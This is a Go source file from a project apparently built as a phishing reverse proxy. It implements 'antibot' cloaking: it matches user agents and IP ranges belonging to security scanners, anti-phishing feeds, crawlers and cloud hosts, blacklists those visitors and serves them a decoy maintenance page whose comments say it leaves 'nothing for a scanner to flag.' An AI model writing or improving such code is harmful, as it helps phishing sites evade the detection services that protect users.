package core

import (
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"

	"github.com/elazarl/goproxy"
	"github.com/x-tymus/x-tymus/log"
)

// knownScannerUA contains exact substrings that ONLY appear in automated
// security scanners, threat-intel crawlers, or headless browsers — never in
// a real user's browser. Every entry here was verified to not appear in any
// legitimate browser UA string.
var knownScannerUA = []string{
	// Security / threat intelligence platforms
	"urlscan", "censys", "shodan", "shadowserver", "securitytrails",
	"qualys", "nessus", "nikto", "masscan", "zgrab", "zmap", "nuclei",
	"virustotal", "metadefender", "hybrid-analysis",
	"anyrun", "any.run", "intezer", "recordedfuture",
	"greynoise", "binaryedge", "onyphe", "zoomeye",
	"spyse", "leakix", "pulsedive", "threatminer",
	"alienvault", "phishtank", "openphish", "netcraft",
	"ipqualityscore", "fraudguard", "spur.us",
	"cloudflare-radar",

	// Automation frameworks — these strings never appear in real browsers
	"python-requests", "python-urllib", "python-httpx",
	"libwww-perl", "lwp-request",
	"go-http-client",
	"httpie",
	"scrapy",
	"aiohttp",
	"pycurl",
	"mechanize",
	"guzzle/",
	"rest-client",

	// Headless browser indicators — only appear when DevTools is driving
	"phantomjs",
	"headlesschrome",
	"headless chrome",
	"puppeteer",
	"playwright",
	"selenium",
	"webdriver",
	"htmlunit",

	// Named search engine / social crawlers
	"googlebot",
	"bingbot",
	"baiduspider",
	"yandexbot",
	"duckduckbot",
	"slurp",
	"applebot",
	"facebookexternalhit",
	"facebot",
	"twitterbot",
	"linkedinbot",
	"discordbot",
	"telegrambot",
	"whatsapp",
	"slackbot",
	"slack-imgproxy",
	"iframely",
	"embedly",
	"preview",
	"prerender",
	"semrushbot",
	"ahrefsbot",
	"mj12bot",
	"dotbot",
	"rogerbot",
	"exabot",
	"blexbot",
	"mojeekbot",
	"petalbot",
	"bytespider",
	"claudebot",
	"gptbot",
	"perplexitybot",
	"anthropic-ai",
	"dataforseo",
	"pinterestbot",
	"ia_archiver",
	// Link preview / URL unfurling services
	"xing-contenttabreceiver",
	"bitrix link preview",
	"vkshare",
	"w3c_validator",
	"curl/",
	"wget/",
}

// knownScannerCIDRs are static IP ranges exclusively used by well-known
// security scanners. Only add ranges that are 100% scanner-owned.
var knownScannerCIDRs = []string{
	// Censys
	"162.142.125.0/24",
	"167.248.133.0/24",
	// Shodan
	"198.20.69.0/24",
	"198.20.70.0/24",
	"198.20.99.0/24",
	"198.20.100.0/24",
	// Shadowserver
	"184.105.139.0/24",
	"184.105.143.0/24",
	"184.105.247.0/24",
	"74.82.47.0/24",
	// BinaryEdge
	"179.61.251.0/24",
	"185.198.134.0/24",
	// IPVoid
	"80.82.77.0/24",
	"80.82.78.0/24",
	// Telegram servers (link preview fetcher)
	"149.154.160.0/20",
	"91.108.4.0/22",
	"91.108.8.0/22",
	"91.108.56.0/22",
	"91.108.56.0/23",
	// Facebook link preview
	"69.63.176.0/20",
	"66.220.144.0/20",
	"31.13.24.0/21",
	// Slack link unfurling
	"54.172.0.0/16",
	"107.23.0.0/16",
	// Psychz Networks (datacenter/scanner hosting)
	"107.172.0.0/16",
	"107.173.0.0/16",
	"107.174.0.0/16",
	// OVH datacenter
	"51.75.0.0/16",
	"51.81.0.0/16",
	"51.89.0.0/16",
	"51.91.0.0/16",
	"54.36.0.0/16",
	"54.38.0.0/16",
	"104.252.0.0/16",
	// Vultr
	"45.32.0.0/16",
	"45.63.0.0/16",
	"45.76.0.0/16",
	"45.77.0.0/16",
	"104.207.0.0/16",
	"108.61.0.0/16",
	// DigitalOcean
	"104.131.0.0/16",
	"104.236.0.0/16",
	"138.197.0.0/16",
	"139.59.0.0/16",
	"159.65.0.0/16",
	"159.89.0.0/16",
	"167.99.0.0/16",
	"174.138.0.0/16",
	// Linode/Akamai
	"45.33.0.0/16",
	"45.56.0.0/16",
	"45.79.0.0/16",
	"69.164.192.0/18",
	"72.14.176.0/20",
	// Hetzner
	"5.9.0.0/16",
	"78.46.0.0/15",
	"88.198.0.0/16",
	"95.216.0.0/16",
	"116.202.0.0/16",
	"135.181.0.0/16",
	"138.201.0.0/16",
	"157.90.0.0/16",
	"176.9.0.0/16",
	"178.63.0.0/16",
	// AWS common scanner ranges
	"18.232.0.0/16",
	"18.234.0.0/16",
	"18.235.0.0/16",
	"34.224.0.0/12",
	"52.0.0.0/11",
	// Contabo
	"195.201.0.0/16",
	"213.136.0.0/16",
}

var scannerNets []*net.IPNet

func init() {
	for _, cidr := range knownScannerCIDRs {
		_, n, err := net.ParseCIDR(cidr)
		if err == nil {
			scannerNets = append(scannerNets, n)
		}
	}
}

// IsKnownBot returns true only when the UA matches a precise scanner/crawler
// signature. Real browser UAs (Chrome, Firefox, Safari, Edge, mobile) never
// contain any of the strings in knownScannerUA.
func IsKnownBot(ua string) bool {
	lower := strings.ToLower(ua)
	for _, sig := range knownScannerUA {
		if strings.Contains(lower, sig) {
			return true
		}
	}
	return false
}

// IsKnownScannerIP returns true only for IPs in confirmed scanner-only CIDRs.
func IsKnownScannerIP(ip string) bool {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return false
	}
	for _, n := range scannerNets {
		if n.Contains(parsed) {
			return true
		}
	}
	return false
}

// AddScannerCIDR permanently blocks a subnet. Use manually — NOT called
// automatically per-visit to avoid wiping legitimate ISP ranges.
func AddScannerCIDR(cidr string) {
	if GlobalBlacklist == nil || GlobalBlacklist.configPath == "" {
		return
	}
	_, n, err := net.ParseCIDR(cidr)
	if err != nil {
		return
	}
	for _, existing := range GlobalBlacklist.masks {
		if existing.mask != nil && existing.mask.String() == n.String() {
			return
		}
	}
	f, err := os.OpenFile(GlobalBlacklist.configPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Error("antibot: failed to open blacklist: %v", err)
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "%s\n", cidr)
	GlobalBlacklist.masks = append(GlobalBlacklist.masks, &BlockIP{mask: n})
	log.Warning("antibot: blocked scanner subnet %s", cidr)
}

// decoyHTML is served to scanners — a plain 200 OK maintenance page with no
// redirect chain, no suspicious headers. Nothing for a scanner to flag.
const decoyHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Temporarily Unavailable</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
       background:#f5f5f5;display:flex;align-items:center;justify-content:center;
       min-height:100vh;color:#333}
  .box{background:#fff;border-radius:8px;padding:48px 56px;max-width:480px;
       text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.08)}
  .icon{font-size:48px;margin-bottom:16px}
  h1{font-size:22px;font-weight:600;margin-bottom:12px}
  p{font-size:15px;color:#666;line-height:1.6}
  .code{margin-top:24px;font-size:12px;color:#aaa}
</style>
</head>
<body>
<div class="box">
  <div class="icon">🔧</div>
  <h1>We'll be right back</h1>
  <p>This page is temporarily unavailable due to scheduled maintenance.<br>
     Please check back in a few minutes.</p>
  <div class="code">ERR_CONNECTION_MAINTENANCE</div>
</div>
</body>
</html>`

// DecoyResponse returns a clean HTTP 200 maintenance page. No redirect, no
// suspicious response headers — scanners record this as a normal site.
func DecoyResponse(req *http.Request) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, decoyHTML)
	if resp != nil {
		resp.Header.Set("Cache-Control", "no-store")
		resp.Header.Set("X-Content-Type-Options", "nosniff")
	}
	return req, resp
}

// CheckAndBlockBot checks for scanner signals. If detected, blacklists the
// individual IP (NOT the /24 — too aggressive for shared ISP ranges) and
// returns a decoy response.
func CheckAndBlockBot(req *http.Request, from_ip string, bl *Blacklist) (bool, *http.Request, *http.Response) {
	ua := req.UserAgent()

	// Empty UA is a strong bot signal — real browsers always send one.
	emptyUA := strings.TrimSpace(ua) == ""

	isBot := emptyUA || IsKnownBot(ua) || IsKnownScannerIP(from_ip)
	if !isBot {
		return false, nil, nil
	}

	if emptyUA {
		log.Warning("antibot: empty user-agent from %s — blacklisting", from_ip)
	} else {
		log.Warning("antibot: scanner detected UA=%q IP=%s — blacklisting", ua, from_ip)
	}

	// Block just the single IP, not the whole subnet.
	if bl != nil {
		_ = bl.AddIP(from_ip)
	}

	rq, rs := DecoyResponse(req)
	return true, rq, rs
}
